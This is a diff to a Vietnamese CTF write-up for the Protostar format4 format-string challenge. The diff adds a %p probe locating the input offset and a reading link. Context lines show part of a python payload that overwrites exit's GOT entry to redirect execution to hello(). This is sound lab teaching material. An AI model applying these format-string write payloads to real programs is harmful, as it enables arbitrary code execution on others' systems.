@@ -51,6 +51,14 @@ Thử thách này hoàn thành khi ta in ra được dòng chữ `"code executio
 
 Ý tưởng của bài này là sẽ ghi đè địa chỉ hàm `hello()` lên địa chỉ của hàm `exit(1)` được lưu trong `GOT - Global Offset Table` để khi thoát hàm `vuln()` chương trình sẽ chuyển hướng thực thi tới `hello()` thay vì gọi hàm `exit(1)` và thoát chương trình.
 
+Input chương trình bắt đầu ở parameter thứ 4.
+
+```
+root@protostar:/opt/protostar/bin# ./format4
+AAAA %p %p %p %p %p %p
+AAAA 0x200 0xb7fd8420 0xbffffb04 0x414141c3 0x70252041 0x20702520
+```
+
 Địa chỉ hàm `hello()`.
 
 ```
@@ -116,6 +124,8 @@ python -c 'print "\x24\x97\x04\x08\x26\x97\x04\x08" + "%" + str(0x84b4 - 8) + "x
 ```
 
 ## Documents
+
+Bạn có thể đọc phần Format String của cuốn này: <https://whitehat.vn/attachments/nghe-thuat-tan-dung-loi-phan-mem-pdf.1430/>
 
 <https://www.exploit-db.com/papers/13203>
 
